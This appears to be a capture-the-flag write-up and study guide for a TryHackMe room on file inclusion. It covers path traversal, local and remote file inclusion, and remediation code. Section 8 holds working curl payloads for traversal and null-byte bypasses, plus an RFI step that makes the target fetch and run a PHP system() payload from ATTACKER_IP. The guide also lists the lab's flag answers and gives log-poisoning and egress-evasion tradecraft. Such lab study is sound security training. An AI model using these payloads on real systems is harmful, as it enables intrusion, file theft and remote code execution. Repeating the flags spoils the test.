# File Inclusion - Comprehensive Technical Guide

---

## 1. Room Overview & Architecture

File Inclusion vulnerabilities represent severe security breakdowns in web applications, cataloged under **OWASP Top 10 (A01: Broken Access Control & A03: Injection)**. These flaws occur when an application dynamically processes file path references supplied by users without adequate validation, sanitization, or canonicalization. Consequently, adversaries can force the web server to disclose arbitrary operating system files, expose application source code, or achieve full Remote Code Execution (RCE).

This module presents an exhaustive technical and practical exploration of three critical attack paradigms:
1. **Path Traversal (Directory Traversal):** Navigating the hierarchical directory tree using dot-dot-slash (`../`) sequences to access files outside the web document root.
2. **Local File Inclusion (LFI):** Forcing PHP execution functions (`include`, `require`) to process local files, combined with tactical filter evasion techniques including null byte injection (`%00`), non-recursive stripping, and mandatory directory prefix bypasses.
3. **Remote File Inclusion (RFI):** Injecting attacker-controlled external URLs to fetch and execute remote code payloads within the target application context.

```
+-----------------------------------------------------------------------------------+
|                        FILE INCLUSION LAB ARCHITECTURE                            |
+-----------------------------------------------------------------------------------+
|                                                                                   |
|  Attacker Machine (Kali / AttackBox)                 Target Server (Apache / PHP) |
|  ===================================                 ============================ |
|                                                                                   |
|  1. Path Traversal / LFI ---------------------------> GET /lab1.php?file=/etc/pwd |
|     (Reads Sensitive Files)                          Returns: root:x:0:0...       |
|                                                                                   |
|  2. Null Byte Bypass -------------------------------> GET /lab3.php?file=...%00   |
|     (Bypasses .php Extension)                        Truncates appended string    |
|                                                                                   |
|  3. Header / Cookie Injection ----------------------> Cookie: THM=../../etc/flag2 |
|     (Captures Flag 2)                                Flag: c00k13_i5_yuMmy1       |
|                                                                                   |
|  4. Remote File Inclusion (RFI) --------------------> GET /playground.php         |
|     Host: python3 -m http.server 8000                 ?file=http://ATTACKER/sh.txt|
|     Target fetches and executes payload <------------ Server executes hostname!   |
|     RCE Confirmed ----------------------------------> Flag: lfi-vm-thm-f8c5b1...  |
|                                                                                   |
+-----------------------------------------------------------------------------------+
```

---

## 2. Target Audience & Prerequisites

* **Target Audience:**
  - Web Application Penetration Testers & Security Engineers.
  - Full-Stack Developers & Backend Architects (PHP, Python, Node.js).
  - SOC Analysts, Incident Responders, and Red Team Operators.
* **Prerequisites:**
  - Solid understanding of Linux filesystem architecture (`/etc`, `/var`, `/proc`).
  - Familiarity with the HTTP/1.1 protocol specification (request methods, URL encoding, header fields).
  - Basic proficiency with `curl`, `Burp Suite`, and lightweight web server hosting (`python3 -m http.server`).

---

## 3. Learning Objectives & Core Concepts

1. Differentiate between Path Traversal, Local File Inclusion (LFI), and Remote File Inclusion (RFI).
2. Identify high-risk PHP file handling and execution functions (`file_get_contents`, `include`, `require`).
3. Master practical evasion techniques:
   - Null byte injection (`%00`) for extension truncation.
   - Non-recursive sanitization bypasses (`....//`).
   - Mandatory directory prefix bypasses.
4. Exploit Remote File Inclusion to achieve immediate Remote Code Execution (RCE).
5. Extract sensitive data through alternative HTTP transmission vectors (POST bodies, Cookies).
6. Implement defensive architectural controls based on strict allowlisting and runtime hardening.

---

## 4. Theoretical Foundations & Technical Deep Dive

### 4.1 Path Traversal vs Local File Inclusion (LFI)
* **Path Traversal:**
  - Relies on raw read functions (e.g. `file_get_contents()`, `readfile()`).
  - Returns file contents strictly as plain text. If pointed at `index.php`, it discloses the PHP source code without evaluating it.
* **Local File Inclusion:**
  - Relies on execution functions (e.g. `include()`, `require()`).
  - If the target file contains executable PHP opening and closing tags (`<?php ... ?>`), the server interprets and executes the payload, enabling log poisoning and session file exploitation.

### 4.2 Prerequisites for Remote File Inclusion (RFI)
For RFI to succeed in PHP, two directives must be enabled in `php.ini`:
1. `allow_url_fopen = On`
2. `allow_url_include = On`
While `allow_url_include` has been disabled by default since PHP 5.2.0, misconfigured enterprise systems and legacy deployments frequently leave this vector exposed.

---

## 5. Practical Lab Topology & Attack Surface

* **Lab Endpoint:** Vulnerable multi-scenario web application on Port 80 (`http://MACHINE_IP`).
* **Attack Surface:**
  - `/lab1.php`: Direct absolute file inclusion without directory prefix.
  - `/lab2.php`: Directory-prefixed inclusion (`includes/`).
  - `/lab3.php`: Extension-appended inclusion (`.php`) requiring null byte truncation.
  - `/lab4.php`: Keyword-filtered file reading via `file_get_contents`.
  - `/lab5.php`: Non-recursive stripping of `../` sequences.
  - `/lab6.php`: Mandatory prefix validation (`THM-profile/`).
  - `/playground.php`: Unrestricted RFI testing environment.
  - `/challenges/`: Multi-vector CTF scenarios testing POST and cookie manipulation.

---

## 6. Tools, Technologies & Protocols

* **Tools:**
  - `curl` (Command-line HTTP client for crafted path requests).
  - `Burp Suite` (Web proxy for intercepting and transforming requests from GET to POST).
  - `Python HTTP Server` (Local payload delivery mechanism for RFI).
* **Protocols & Wrappers:**
  - HTTP/1.1 (GET, POST, Cookies, Custom Headers).
  - PHP Stream Wrappers (`php://filter`, `data://`).

---

## 7. Step-by-Step Task Execution Matrix

| Task # | Task Title | Core Focus | Verified Outcome | Detailed Documentation |
| :---: | :--- | :--- | :---: | :---: |
| **01** | Introduction | Scope, theory, and OWASP Top 10 alignment | `No answer needed` | [TASK-01.md](file:///e:/THM-JR-PENETRATION-TESTER/08-WEB-APPLICATION-VULNERABILITIES-II/03-FILE-INCLUSION/TASKS/TASK-01.md) |
| **02** | Deploy the VM | Target deployment & connectivity check | `No answer needed` | [TASK-02.md](file:///e:/THM-JR-PENETRATION-TESTER/08-WEB-APPLICATION-VULNERABILITIES-II/03-FILE-INCLUSION/TASKS/TASK-02.md) |
| **03** | Path Traversal | Mechanics of `file_get_contents` & target files | `file_get_contents` | [TASK-03.md](file:///e:/THM-JR-PENETRATION-TESTER/08-WEB-APPLICATION-VULNERABILITIES-II/03-FILE-INCLUSION/TASKS/TASK-03.md) |
| **04** | LFI (Part 1) | Absolute path inclusion & prefix disclosure | `/lab1.php?file=/etc/passwd` & `includes` | [TASK-04.md](file:///e:/THM-JR-PENETRATION-TESTER/08-WEB-APPLICATION-VULNERABILITIES-II/03-FILE-INCLUSION/TASKS/TASK-04.md) |
| **05** | LFI (Part 2) | Null byte injection & OS release fingerprinting | `%00`, `file_get_contents`, `THM-profile`, `12.04` | [TASK-05.md](file:///e:/THM-JR-PENETRATION-TESTER/08-WEB-APPLICATION-VULNERABILITIES-II/03-FILE-INCLUSION/TASKS/TASK-05.md) |
| **06** | RFI | Remote execution theory & `php.ini` requirements | `No answer needed` | [TASK-06.md](file:///e:/THM-JR-PENETRATION-TESTER/08-WEB-APPLICATION-VULNERABILITIES-II/03-FILE-INCLUSION/TASKS/TASK-06.md) |
| **07** | Challenge | Capturing Flags 1-3 & Playground Hostname RCE | 3 Flags + `lfi-vm-thm-f8c5b1a78692` | [TASK-07.md](file:///e:/THM-JR-PENETRATION-TESTER/08-WEB-APPLICATION-VULNERABILITIES-II/03-FILE-INCLUSION/TASKS/TASK-07.md) |
| **08** | Remediation | Architectural allowlisting & defensive hardening | `No answer needed` | [TASK-08.md](file:///e:/THM-JR-PENETRATION-TESTER/08-WEB-APPLICATION-VULNERABILITIES-II/03-FILE-INCLUSION/TASKS/TASK-08.md) |

---

## 8. Offensive Security Playbook

### Phase 1: Local File Inclusion & Traversal Bypass (Labs 1-6)
```bash
# Lab 1: Read /etc/passwd via absolute path
curl -s "http://MACHINE_IP/lab1.php?file=/etc/passwd"

# Lab 2: Traverse out of the prepended includes/ directory
curl -s "http://MACHINE_IP/lab2.php?file=../../../../etc/passwd"

# Lab 3: Bypass appended .php extension using null byte injection
curl -s "http://MACHINE_IP/lab3.php?file=../../../../etc/passwd%00"

# Lab 6: Satisfy mandatory prefix directory and extract OS version
curl -s "http://MACHINE_IP/lab6.php?file=THM-profile/../../../../../etc/os-release"
# -> Output reveals: VERSION_ID="12.04"
```

### Phase 2: Challenge Exploitation (Flags 1-3)
```bash
# Challenge 1: Convert GET request to POST with null byte
curl -s -X POST "http://MACHINE_IP/challenges/chall1.php" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "file=../../../../etc/flag1%00"
# -> Flag: F1x3d-iNpu7-f0rrn

# Challenge 2: Tamper with session cookie header
curl -s "http://MACHINE_IP/challenges/chall2.php" \
     -H "Cookie: THM=../../../../etc/flag2%00"
# -> Flag: c00k13_i5_yuMmy1

# Challenge 3: Bypass GET filter via POST parameter transmission ($_REQUEST)
curl -s -X POST "http://MACHINE_IP/challenges/chall3.php" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "file=../../../../etc/flag3%00"
# -> Flag: P0st_1s_w0rk1in9
```

### Phase 3: Remote File Inclusion to RCE (Playground)
1. Host a command execution payload on attacker infrastructure:
   ```bash
   echo "<?php system('hostname'); ?>" > hostname.txt
   python3 -m http.server 8000
   ```
2. Trigger the remote inclusion via the `file` query parameter:
   ```bash
   curl -s "http://MACHINE_IP/playground.php?file=http://ATTACKER_IP:8000/hostname.txt"
   ```
3. Extracted system hostname: **`lfi-vm-thm-f8c5b1a78692`**.

---

## 9. Defensive & Remediation Blueprint

1. **Implement Strict Static Allowlisting:**
   ```php
   $allowed_files = [
       'home' => 'modules/home.php',
       'profile' => 'modules/profile.php',
       'contact' => 'modules/contact.php'
   ];
   $page = $_GET['page'] ?? 'home';
   if (!array_key_exists($page, $allowed_files)) {
       http_response_code(400);
       die("Invalid resource requested.");
   }
   include($allowed_files[$page]);
   ```
2. **Harden Runtime Directives in `php.ini`:**
   ```ini
   allow_url_fopen = Off
   allow_url_include = Off
   display_errors = Off
   log_errors = On
   ```
3. **Enforce Canonical Path Verification:**
   ```php
   $clean_name = basename($_GET['file']);
   $resolved = realpath("/var/www/html/uploads/" . $clean_name);
   if (!$resolved || !str_starts_with($resolved, "/var/www/html/uploads/")) {
       die("Path traversal detected.");
   }
   ```

---

## 10. OpSec & Red Team Operational Tradecraft

* **Avoiding Syntax Errors in Log Poisoning:** When poisoning web server logs (`access.log`), verify PHP payload syntax locally before transmission. A syntax error crashes the PHP execution engine for that log, destroying the exploit vector and raising immediate SOC alerts.
* **Egress Filtering Evasion:** When assessing environments where outbound HTTP (Port 80/8000) is filtered by enterprise firewalls, host RFI payloads over standard HTTPS (Port 443) or SMB (Port 445 on Windows targets).

---

## 11. Real-World Threat Intelligence & Case Studies

* **WordPress Plugin Vulnerabilities (Slider Revolution, MailPoet):** Millions of production websites have been compromised via LFI flaws in commercial plugins, where adversaries extracted `wp-config.php` database credentials and established administrative backdoors.
* **Log4Shell (CVE-2021-44228):** While utilizing JNDI LDAP references in Java, Log4Shell demonstrated the catastrophic danger of dynamic remote class/code loading, sharing philosophical parity with PHP Remote File Inclusion.

---

## 12. Comprehensive Troubleshooting & Edge Cases

* **Issue:** Null byte injection fails and `.php` remains attached to the requested path.
  - **Root Cause:** Target PHP runtime is version 5.3.4 or newer, where null byte handling in filesystem APIs is patched.
  - **Workaround:** Utilize path truncation (long sequences of `.` and `/`) on legacy systems, or look for alternative injection vectors like PHP filters or wrappers.
* **Issue:** Remote File Inclusion yields a connection timeout.
  - **Root Cause:** Routing failure between target VM and attack host, or local firewall blocking incoming port 8000 requests. Verify tunnel IP binding on the `tun0` interface.

---

## 13. Knowledge Verification & Self-Assessment

1. What distinguishes the operational output of `file_get_contents()` from `include()` when processing PHP files?
2. Why is the null byte injection vulnerability obsolete in modern PHP runtime environments?
3. What specific `php.ini` directive prevents adversaries from executing Remote File Inclusion attacks?
4. How does the `php://filter` stream wrapper allow penetration testers to read application source code without execution?

---

## 14. References & Further Reading

* [Authoritative References & Documentation](file:///e:/THM-JR-PENETRATION-TESTER/08-WEB-APPLICATION-VULNERABILITIES-II/03-FILE-INCLUSION/REFERENCES.md)
* [Deep Technical Notes & PHP Stream Wrappers](file:///e:/THM-JR-PENETRATION-TESTER/08-WEB-APPLICATION-VULNERABILITIES-II/03-FILE-INCLUSION/ADDITIONAL-NOTES.md)
* [Task Matrix & Quick Reference](file:///e:/THM-JR-PENETRATION-TESTER/08-WEB-APPLICATION-VULNERABILITIES-II/03-FILE-INCLUSION/TASKS.md)
* [OWASP Testing for Local File Inclusion Guide](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
